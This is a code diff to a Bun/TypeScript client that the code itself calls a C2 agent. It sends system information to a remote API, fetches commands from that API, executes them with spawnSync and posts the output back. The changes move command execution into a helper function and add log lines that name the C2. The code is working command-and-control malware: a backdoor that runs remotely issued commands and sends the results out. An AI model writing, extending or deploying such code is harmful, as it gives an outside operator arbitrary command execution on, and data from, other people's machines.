@@ -1,4 +1,4 @@
-import { argv, spawnSync } from "bun";
+import { argv, spawnSync, type SyncSubprocess } from "bun";
 import os from "os";
 import type { CommandPayloadDTO } from "./types";
 import chalk from "chalk";
@@ -47,7 +47,7 @@ function getPhpVersion() {
 async function postInfo() {
   try {
     const systemInfo = getSystemInfo();
-
+    console.log('POSTing payload to C2:', systemInfo);
     await fetch(`${API_BASE_URL}/node-info`, {
       method: "POST",
       headers: {
@@ -65,29 +65,34 @@ async function getAndRunRemoteCommand() {
     const response = await fetch(`${API_BASE_URL}/remote-command`);
     const payload = (await response.json()) as CommandPayloadDTO;
     const command = payload.command;
+
+    // Run the command if it exists
     if (command) {
-      const commandArr = command.split(" "); // TODO: Add handling for when commands come with strings that are seperated by spaces
-      const process = spawnSync(commandArr);
-      const stdout = process.stdout.toString();
-      const stderr = process.stderr.toString();
-      console.log(chalk.greenBright(stdout ? stdout : stderr));
+      const proc = runCommand(command)
+      console.log(chalk.greenBright(proc.stdout ? proc.stdout.toString() : proc.stderr.toString()));
       console.log(chalk.yellowBright("ABOVE OUTPUT from command:", command));
 
+      // Post the command output to C2
       await fetch(`${API_BASE_URL}/remote-command`, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
+        headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
           commandRan: command,
-          output: stdout ? stdout : stderr,
-          error: stderr ? "True" : "False",
+          output: proc.stdout ? proc.stdout.toString() : proc.stderr.toString(),
+          error: proc.stderr ? "True" : "False",
         }),
       });
     }
-  } catch (err: unknown) {
+   } catch (err: unknown) {
     console.error(err);
   }
+}
+
+function runCommand(command: string): SyncSubprocess<"pipe", "pipe"> {
+  const commandArr = command.split(" "); // TODO: Add handling for when commands come with strings that are seperated by spaces
+  const process = spawnSync(commandArr); // Run the command
+
+  return process
 }
 function runClient() {
   console.log("Pinging server @", API_BASE_URL);
